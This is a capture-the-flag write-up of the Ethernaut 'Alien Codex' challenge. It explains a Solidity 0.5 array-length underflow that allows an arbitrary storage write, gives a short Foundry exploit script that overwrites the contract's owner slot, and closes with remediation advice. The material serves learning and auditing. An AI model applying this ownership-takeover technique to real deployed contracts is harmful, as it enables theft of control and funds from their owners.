# Alien Codex — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 20 — Alien Codex](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-alien-codex) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `AlienCodex` (Solidity 0.5 on SCH) |
| **Severity** | Critical (ownership takeover via storage collision) |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

In Solidity 0.5, `codex.length--` on an empty array underflows the length to `2^256 - 1`. `revise` then becomes an arbitrary storage write. Choosing index `i` so that `keccak256(1) + i ≡ 0` overwrites slot 0 (`owner`) with the player.

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Player is owner | `alienCodexInstance.owner() == PLAYER_ADDRESS` |

---

## Finding

### [C-01] Array length underflow → slot 0 overwrite

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Storage collision / unchecked arithmetic (0.5) |
| **Location** | `retract`, `revise` |

#### Proof of concept

```bash
cd web3-ctf-challenges/20-ethernaut-alien-codex
forge test --match-test testExploit -vv
```

---

## Exploit implementation

### SCH (`Exploit.s.sol`) — Solidity 0.5 / `AlienScript` harness

Use the classic index with the trailing `+ 1` (same as `-keccak256(1)` under uint wrap):

```solidity
function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    alienCodexInstance.makeContact();
    alienCodexInstance.retract();

    uint256 index = uint256(-1) - uint256(keccak256(abi.encode(uint256(1)))) + 1;
    alienCodexInstance.revise(index, bytes32(uint256(uint160(PLAYER_ADDRESS))));

    vm.stopBroadcast();
}
```

Instance name: `alienCodexInstance`. Harness: `reference/AlienScript.sol`.

---

## Remediation

Use Solidity ≥0.8 (checked arithmetic, no writable `.length`). Prefer `pop()` / bounded arrays. Never allow user-controlled indices into storage after an unconstrained length.

---

## References

- [Ethernaut Alien Codex (OZ)](https://ethernaut.openzeppelin.com/)
- Solidity storage layout — dynamic arrays
